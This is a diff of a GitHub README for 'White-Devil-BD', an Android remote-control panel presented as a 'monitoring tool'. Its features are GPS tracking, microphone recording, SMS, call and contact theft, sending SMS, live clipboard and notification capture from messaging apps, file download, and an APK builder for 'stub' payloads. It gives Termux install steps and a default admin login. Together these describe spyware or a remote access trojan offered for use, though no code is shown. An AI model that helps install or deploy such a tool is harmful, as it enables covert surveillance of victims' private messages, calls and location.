@@ -1,44 +1,95 @@
-# White-Devil-BD 
+<p align="center">
 
-<br>#installation Guide termux
+<img src="https://github.com/TuserAhammed/White-Devil-BD/blob/main/ic_launcher.png" height="60"><br>
 
-<br>1 pkg update
-<br>2 pkg upgrade 
-<br>3 pkg install git
-<br>4 git clone https://github.com/TuserAhammed/White-Devil-BD.git 
+A cloud based Android Monitoring Tool, powered by NodeJS
 
-<br>_______________________
-Features _______________________
+</p>
 
-<br>•GPS Logging
+## Features
 
-<br>•Microphone Recording
+- GPS Logging
 
-<br>•View Contacts
+- Microphone Recording
 
-<br>•SMS Logs
+- View Contacts
 
-<br>•Send SMS
+- SMS Logs
 
-<br>•Call Logs
+- Send SMS
 
-<br>•View Installed Apps
+- Call Logs
 
-<br>•View Stub Permissions
+- View Installed Apps
 
-<br>•Live Clipboard Logging
+- View Stub Permissions
 
-<br>•Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail and more ....)
+- Live Clipboard Logging
 
-<br>•View WiFi Networks (logs previously seen)
+- Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail and more ....)
 
-<br>•File Explorer & Downloader
+- View WiFi Networks (logs previously seen)
 
-<br>•Command Queuing
+- File Explorer & Downloader
+
+- Command Queuing
+
+- Built In APK Builder
+
+## Prerequisites 
+
+ - Java Runtime Environment 11 or above
+
+ - NodeJs 
+
+ - A Server with Static IP Address
+
+## Installation 
+
+1. Update System
+
+    - Termux
+
+        - `pkg update -y`
+
+   
+
+2. Upgrade System
+
+    - Termux
+
+        - `pkg upgrade`
+
+3. install Git
+
+    - `pkg install git -y`
+
+4. Clone the repo
+
+    - `git clone https://github.com/TuserAhammed/White-Devil-BD.git`
+
+    
+
+5. Go to server directory
+
+   - `cd White-Devil-BD`
+
+5. In this directory, run these commands
+
+    - `bash all-linux.sh` <- install dependencies and Run The SYSTEM
+
+6. In your browser navigate to your Server Static IP Address` Ex.: http://localhost:22533/`
+
+7. Login details
+
+     - `Username : admin`
+
+     - `Password : Tuser`
+
+    
 
 
 
-<br>•Built In APK Builder
 
 
 
@@ -57,9 +108,48 @@ Features _______________________
 
 
 
-<br>_______________________
-Admin Pannel Login Information_______________________
 
-Username : admin
 
-password : Tuser
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
